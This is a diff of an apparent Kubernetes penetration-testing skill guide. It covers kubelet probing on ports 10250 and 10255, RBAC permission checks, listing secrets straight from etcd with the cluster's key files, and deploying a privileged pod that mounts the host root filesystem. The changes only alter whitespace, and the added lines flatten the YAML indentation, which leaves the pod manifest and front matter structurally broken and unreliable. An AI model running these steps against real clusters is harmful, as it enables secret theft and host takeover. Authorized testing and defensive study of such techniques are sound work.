@@ -1,13 +1,13 @@
 ---
 name: performing-kubernetes-penetration-testing
 description: >-
-  Evaluates Kubernetes cluster security by actively simulating attacker techniques against the
-  API server, kubelet, etcd, pods, RBAC, network policy, and secrets, using kube-hunter,
-  Kubescape, peirates, and manual kubectl exploitation to find paths to cluster compromise.
-  Use for an authorized penetration test or hands-on validation that controls actually stop an
-  attacker. Keywords: kube-hunter, Kubescape, peirates, kubelet 10250, anonymous auth, token
-  theft, lateral movement, cluster takeover. Do not use for a configuration-only compliance
-  audit - use performing-kubernetes-cis-benchmark-with-kube-bench.
+ Evaluates Kubernetes cluster security by actively simulating attacker techniques against the
+ API server, kubelet, etcd, pods, RBAC, network policy, and secrets, using kube-hunter,
+ Kubescape, peirates, and manual kubectl exploitation to find paths to cluster compromise.
+ Use for an authorized penetration test or hands-on validation that controls actually stop an
+ attacker. Keywords: kube-hunter, Kubescape, peirates, kubelet 10250, anonymous auth, token
+ theft, lateral movement, cluster takeover. Do not use for a configuration-only compliance
+ audit - use performing-kubernetes-cis-benchmark-with-kube-bench.
 domain: cybersecurity
 subdomain: container-security
 tags:
@@ -94,7 +94,7 @@ curl -k https://target-cluster.com:6443/api/v1/namespaces
 
 # Check for exposed kubelet
 curl -k https://node-ip:10250/pods
-curl http://node-ip:10255/pods  # Read-only kubelet
+curl http://node-ip:10255/pods # Read-only kubelet
 ```
 
 ### Step 2: Automated Scanning with kube-hunter
@@ -169,7 +169,7 @@ kubectl auth can-i create pods
 kubectl auth can-i create pods --subresource=exec
 kubectl auth can-i get secrets
 kubectl auth can-i create clusterrolebindings
-kubectl auth can-i '*' '*'  # cluster-admin check
+kubectl auth can-i '*' '*' # cluster-admin check
 
 # Enumerate service account tokens
 kubectl get serviceaccounts -A
@@ -199,10 +199,10 @@ kubectl get pods -A -o json | jq '.items[].spec.volumes[]? | select(.secret)'
 
 # Search etcd directly (if accessible)
 ETCDCTL_API=3 etcdctl --endpoints=https://etcd-ip:2379 \
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
-  --key=/etc/kubernetes/pki/etcd/server.key \
-  get /registry/secrets --prefix --keys-only
+ --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+ --cert=/etc/kubernetes/pki/etcd/server.crt \
+ --key=/etc/kubernetes/pki/etcd/server.key \
+ get /registry/secrets --prefix --keys-only
 ```
 
 ### Step 7: Pod Exploitation
@@ -213,24 +213,24 @@ cat <<EOF | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pentest-pod
-  namespace: default
+ name: pentest-pod
+ namespace: default
 spec:
-  hostNetwork: true
-  hostPID: true
-  containers:
-  - name: pentest
-    image: ubuntu:22.04
-    command: ["sleep", "infinity"]
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host-root
-      mountPath: /host
-  volumes:
-  - name: host-root
-    hostPath:
-      path: /
+ hostNetwork: true
+ hostPID: true
+ containers:
+ - name: pentest
+ image: ubuntu:22.04
+ command: ["sleep", "infinity"]
+ securityContext:
+ privileged: true
+ volumeMounts:
+ - name: host-root
+ mountPath: /host
+ volumes:
+ - name: host-root
+ hostPath:
+ path: /
 EOF
 
 # Exec into pod
